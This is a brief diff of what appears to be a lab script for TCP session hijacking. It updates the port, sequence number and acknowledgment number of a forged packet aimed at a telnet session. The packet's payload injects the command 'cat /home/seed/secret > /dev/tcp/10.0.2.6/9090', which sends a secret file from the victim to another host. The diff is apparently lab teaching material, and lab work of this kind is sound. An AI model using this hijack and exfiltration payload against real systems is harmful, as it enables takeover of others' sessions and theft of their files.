@@ -17,10 +17,10 @@ def send_tcp_packet(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num, ttl_va
 # change the following 9 lines
 source_ip = "10.0.2.4"
 destination_ip = "10.0.2.5"
-source_port = 45736
+source_port = 59830
 destination_port = 23
-sequence_num = 1717083005
-acknowledgment_num = 1242665292
+sequence_num = 3366342961
+acknowledgment_num = 4096614496
 ttl_value = 64
 window_size = 501
 tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
